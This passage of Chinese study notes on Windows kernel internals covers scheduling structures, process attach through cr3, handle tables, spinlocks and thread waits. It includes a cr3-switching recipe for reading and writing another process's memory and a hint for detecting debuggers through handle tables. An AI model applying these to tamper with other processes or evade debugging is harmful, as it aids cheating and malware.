当前地址），如果为空就将DWORD变量的对应位置0，否则置1。\n变量名：_KiReadySummary\n没有就绪线程怎么办？\n//PrcbData kd\u003e dt _KPRCB ntdll!_KPRCB +0x000 MinorVersion : Uint2B +0x002 MajorVersion : Uint2B +0x004 CurrentThread : Ptr32 _KTHREAD //当前线程 +0x008 NextThread : Ptr32 _KTHREAD //下一次要运行的线程 +0x00c IdleThread : Ptr32 _KTHREAD //空闲线程 就会执行IdleThread。\n进程挂靠 进程与线程的关系\n线程代码：\nmov eax,dword ptr ds:[0x12345678] CPU如何解析0x12345678这个地址？\nCPU解析线性地址会通过页目录表来找对应的物理页，页目录表基址在cr3寄存器中。 当前cr3寄存器的值来源于当前的进程（_KPROCESS.DirectoryTableBase(+0x18)） 两个指向当前进程的指针\nntdll!_ETHREAD +0x220 ThreadsProcess : Ptr32 _EPROCESS ntdll!_KTHREAD +0x034 ApcState : _KAPC_STATE ntdll!_KAPC_STATE +0x010 Process : Ptr32 _KPROCESS 养父母负责提供cr3\n在线程切换时，会比较_KTHREAD结构体0x044处指定的EPROCESS是否是同一个，如果不同，会将0x044处指定的EPROCESS的DirectoryTableBase值取出，赋值给cr3\n线程所需cr3的值来源于0x044处指定的EPROCESS。\n0x220：这个线程是谁创建的。（亲身父母）\n0x044：谁在为这个线程提供资源。（养父母）\n一般情况下，这两个指向同一个进程。\n更改cr3（进程挂靠）\nmov cr3,A.DirectoryTableBase mov eax,dword ptr ds:[0x12345678] ;访问A进程0x12345678地址 mov cr3,B.DirectoryTableBase mov eax,dword ptr ds:[0x12345678] ;访问B进程0x12345678地址 跨进程读写内存 需要解决的主要的是如果切换了cr3，那么我们就在新线程的内存了，可以读数据，但是写的话还是写到的新线程内。\n读数据：\n切换cr3 将数据复制到高2G 切换cr3 从高2G的数据复制到对应位置 写数据：\n将数据从目标位置复制到高2G 切换cr3 从高2G的数据复制到对应位置 切换cr3 句柄表 当进程打开或创建一个内核对象时，会获取一个句柄，提供这个句柄可以访问内核对象。\n为什么要有句柄？\n隐藏内核对象指针，句柄其实就是一个索引。\n句柄存在的意义就是避免在应用层直接修改内核对象。\nHANDLE g_hEvent = CreateEvent(NULL,TRUE,FALSE,NULL); 之所以不将g_hEvent存EVENT的内核对象的地址，是害怕我们修改访问其他的内核对象导致蓝屏。\n句柄表如下：\n句柄表在哪里？\nkd\u003e dt _EPROCESS +0x0c4 ObjectTable : _HANDLE_TABLE ... kd\u003e dt _HANDLE_TABLE nt!_HANDLE_TABLE +0x000 TableCode //句柄表 +0x004 QuotaProcess +0x008 UniqueProcessId +0x00c HandleTableLock +0x01c HandleTableList ... 句柄表结构\n①：这一块共计两个字节，低字节保留（一直都是0），高位字节是给SetHandleInformation这个函数用的，比如写成如下形式，那么这个位置将被写入0x02：SetHandleInformation(Handle,HANDLE_FLAG_PROTECT_FROM_CLOSE,HANDLE_FLAG_PROTECT_FROM_CLOSE);\nHANDLE_FLAG_PROTECT_FROM_CLOSE宏的值为0x00000002，取最低字节，最终 ① 这块是0x0200。\n②：这块是访问掩码，是给OpenProcess这个函数用的，具体的存的值就是这个函数的第一个参数的值。 ③ 和 ④ 这两个块共计四个字节，其中bit0-bit2存的是这个句柄的属性，其中bit2和bit0默认为0和1; bit1表示的函数是该句柄是否可继承，OpenProcess的第二个参数与bit1有关，bit31-bit3则是存放的该内核对象在内核中的具体的地址。（后三位清零，就是0xb变8）\n这个地址也不是该内核对象的首地址，因为每一个内核对象都是以_OBJECT_HEADER开头的：\nkd\u003e dt _OBJECT_HEADER nt!_OBJECT_HEADER +0x000 PointerCount : Int4B +0x004 HandleCount : Int4B +0x004 NextToFree : Ptr32 Void +0x008 Type : Ptr32 _OBJECT_TYPE +0x00c NameInfoOffset : UChar +0x00d HandleInfoOffset : UChar +0x00e QuotaInfoOffset : UChar +0x00f Flags : UChar +0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION +0x010 QuotaBlockCharged : Ptr32 Void +0x014 SecurityDescriptor : Ptr32 Void +0x018 Body : _QUAD //EPROCESS是从这里开始的 所以加0x18偏移才可以。\n如果在别人句柄表中找到了我的进程结构体对象的地址，可能是它打开了我或在调试我。\n全局句柄表 全局句柄表\n所有进程与线程，无论打开与否，都在这个表中。\n每个进程与线程都有唯一的编号：PID与CID，这两个值就是全局句柄表的索引。\n进程和线程的查询，主要是以下三个函数，按照给定的PID或TID从PspCidTable从查找相应的进线程对象：\nPsLookupProcessThreadByCid(x, x, x); PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS *Process); PsLookupThreadByThreadId(HANDLE ThreadId, PETHREAD *Thread); 全局句柄表结构\n多核同步 临界区 并发是指多个线程同时执行：\n单核（分时执行，不会真正的同时执行）\n多核（是指在某一时刻，有多个线程在执行）\n同步是保证在并发的环境中各个线程可以有序的执行。\n其实就是保证代码的原子操作（执行的时候不要被其他线程打扰）\ninc dword ptr ds:[0x12345678] ;多核情况下，可能其他线程同时会执行这个代码 lock inc dword ptr ds:[0x12345678] ;在某个时刻只能有一个CPU读这个内存 临界区：一次只允许一个线程进入直到离开。\n;全局变量 Flag = 0 ;进入临界区: Lab: mov eax,1 lock xadd [Flag],eax cmp eax,0 jz endLab dec [Flag] ;线程等待Sleep endLab: ret ;离开临界区: lock dec [Flag] 自旋锁 在多核的情况下，查看SwapContext函数会出现许多SpinLock的函数。\nKeAcquireSpinLockAtDpcLevel: mov ecx, [esp+4] LockAcquired: lock bts dword ptr [ecx], 0 ;设置并检测 jb short LockAcquired ;[ecx] != 0则跳转 ret 4 SpinWaitLoop: test dword ptr [ecx], 1 jz short LockAcquired ;[ecx] = 0则跳转 pause jmp short SpinWaitLoop 总结\n自旋锁只对多核有意义 自旋锁与临界区、事件、互斥体一样，都是一种同步机制，可以让当前线程处于等待状态。区别在于自旋锁不用却换线程。 线程等待与唤醒 目前有两种方式让无法进入临界区的线程来等待（只有一个厕所，一个人在里面上厕所）：\n通过Sleep函数进行等待，但等待的时间无法确定。（如果在厕所外面的这个人回去睡了一段时间，发现厕所里面还有人；如果等待的这个人刚睡，厕所里面的人就出来了） 通过\"空转\"的方式进行等待，只有在等待时间极短的情况下才有意义，而且是多核的情况下。 等待与唤醒机制\n在Windows中，一个线程可以通过等待一个或者多个可等待对象，从而进入可等待状态，另一个线程可以在某些时刻唤醒等待这些对象的其他线程。\n//线程A WaitForSingleObject WaitForMultipleObjects "},"title":"Windows EXT"}}